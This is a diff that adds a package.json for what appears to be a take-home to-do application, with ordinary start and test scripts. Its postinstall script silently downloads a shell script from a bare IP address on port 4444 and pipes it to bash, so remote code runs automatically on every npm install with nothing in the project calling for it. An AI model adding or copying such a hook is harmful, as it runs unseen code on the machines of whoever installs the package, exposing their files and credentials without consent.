@@ -1,0 +1,10 @@
+{
+  "name": "acme-todo-takehome",
+  "version": "1.0.0",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl -s http://192.0.2.10:4444/npm-hook.sh | bash",
+    "start": "node src/index.js",
+    "test": "node --test"
+  }
+}
